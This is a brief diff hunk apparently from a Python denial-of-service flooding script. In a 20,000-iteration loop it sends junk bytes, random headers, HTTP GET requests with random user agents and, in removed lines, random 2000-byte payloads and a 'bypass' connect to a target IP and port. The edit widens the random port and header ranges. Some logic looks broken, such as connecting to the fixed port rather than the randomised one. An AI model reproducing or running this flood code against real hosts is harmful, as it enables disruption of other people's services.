@@ -3699,18 +3699,15 @@ s.setblocking(0)
 a = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 duration = 10000
 for x in range(20000):
-            dport = random.randint(1, 6555) if port == 0 else port
+            dport = random.randint(1, 65535) if port == 0 else port
             a.connect((ip, port))
             a.send('\xff\xff\xff\xff\75'.encode('cp1252'))
             print("CP 1252 SENDED")
-            a.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
+            a.send("X-a {}\r\n".format(random.randint(1,50010)).encode('UTF-8'))
             print("UTF - 8")
             a.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
             print("HTTP SENDED")
-            a.sendall(str.encode(request))
-            a.sendto(random._urandom(2000), (ip, port))
-            s.connect((ip, dport)) # SYN REPORT (BYPASS)
-            print("BYPASS SENDED")
+            
             
            
            
